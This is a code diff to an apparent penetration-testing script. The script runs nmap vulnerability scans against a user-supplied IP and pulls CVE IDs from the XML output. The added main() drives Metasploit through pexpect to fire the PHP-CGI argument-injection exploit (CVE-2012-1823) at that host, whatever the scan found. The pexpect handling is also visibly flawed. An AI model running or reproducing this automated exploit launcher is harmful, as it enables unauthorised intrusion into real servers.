@@ -1,7 +1,7 @@
 #!/bin/python3.6
 
 import subprocess
-
+from bs4 import BeautifulSoup as bs
 import sys
 import time
 import progressbar
@@ -10,6 +10,7 @@ import pexpect
 from colorama import Fore
 import xml.etree.ElementTree as ET
 import readline
+import re
 
 # Function for implementing the loading animation
 def load_animation():
@@ -143,8 +144,7 @@ if resp =='1':
 
         for host in root.findall("host"):
             details={"address": host. find("address")
-            .attrib.get("addr"),"name":host.find
-            ("hostnames").find("hostname").attrib.get("name") }
+            .attrib.get("addr") }
             port_list=[]
             print (str(host))
             ports=host.find("ports")
@@ -198,8 +198,7 @@ elif resp =='2':
 
         for host in root.findall("host"):
             details={"address": host. find("address")
-            .attrib.get("addr"),"name":host.find
-            ("hostnames").find("hostname").attrib.get("name") }
+            .attrib.get("addr") }
             port_list=[]
             print (str(host))
             ports=host.find("ports")
@@ -240,7 +239,7 @@ elif resp =='2':
 elif resp =='3':
     print(Fore.YELLOW+"Nmap Scanning In Progress.....")
     print(Fore.YELLOW+"Please Wait.")
-    p = subprocess.Popen(["nmap","-sS","--script=vuln","-Pn", "-v", ip_addr, "-p "+ports,"-oX",file_name], stdout=subprocess.PIPE)
+    p = subprocess.Popen(["nmap","-sV","--script=vuln", ip_addr, "-p "+ports,"-oX",file_name], stdout=subprocess.PIPE)
     (output, err) = p.communicate()
     msg = output.decode('utf-8').strip()
     #print(msg)
@@ -249,12 +248,10 @@ elif resp =='3':
         root=tree.getroot()
         tag=root.tag
         hosts=[]
-
+        port_list=[]
         for host in root.findall("host"):
             details={"address": host. find("address")
-            .attrib.get("addr"),"name":host.find
-            ("hostnames").find("hostname").attrib.get("name") }
-            port_list=[]
+            .attrib.get("addr") }
             print (str(host))
             ports=host.find("ports")
             for port in ports:
@@ -298,17 +295,52 @@ elif resp =='3':
     #print(msg)
         
 print(Fore.MAGENTA+"Nmap Scanning Completed!")
+print(Fore.MAGENTA+"Collecting CVES")
 
-try:
-    try:
-        with open(r'file_name') as f:
-            contents=f.readlines()
-        contents=str(contents)
-        cves=re.findall("(cve\d)-(\d+)",contents)
-        for cve in cves:
-            print(Fore.RED+"[+]"+cve)
-    except:
-        print(Fore.YELLOW+"[-]"+"No CVE found")
-except FileNotFoundError as fnf2_error:
-    print(Fore.RED+"[*] "+fnf2_error)
+content = []
+cves = []
+    # Read the XML file
+print(Fore.GREEN+"===========================================================================================")
+with open(file_name, "r") as file:
+    # Read each line in the file, readlines() returns a list of lines
+    content = file.readlines()
+    # Combine the lines in the list into a string
+    content = "".join(content)
+    bs_content = bs(content,features="xml")
+    result = bs_content.find_all("elem")
+    third_child = bs_content.find_all("elem", {"key": "id"})
+    cve_list=[]
+    for cve_tags in third_child:
+        cve_list.append(cve_tags)
+    cve_list=str(cve_list)
+    cves=re.findall("CVE-\d{4}-\d{4,7}",cve_list)
+    #print(cves)
+    for cve in cves:
+    	print(Fore.RED+"[+]"+Fore.RESET,Fore.YELLOW+cve)
+
+print(Fore.GREEN+"===========================================================================================")
+
+
+global use_exploit
+def main():
+    
+    child = pexpect.spawn('msfconsole -q')
+    child.expect('.*>')
+    child.sendline('search CVE-2012-1823')
+    #print(child.before.decode())
+    child.interact()
+    child.expect('.*>')
+    child.sendline('use ' + 'exploit/multi/http/php_cgi_arg_injection')
+    child.interact()
+    child.expect('.*>')
+    child.sendline('SET RHOSTS '+str(ip_addr))
+    #print(child.before.decode())
+    child.interact()
+    child.expect('.*>')
+    child.sendline('run')
+    child.interact()
+if __name__ == '__main__':
+    main()
+
+
 
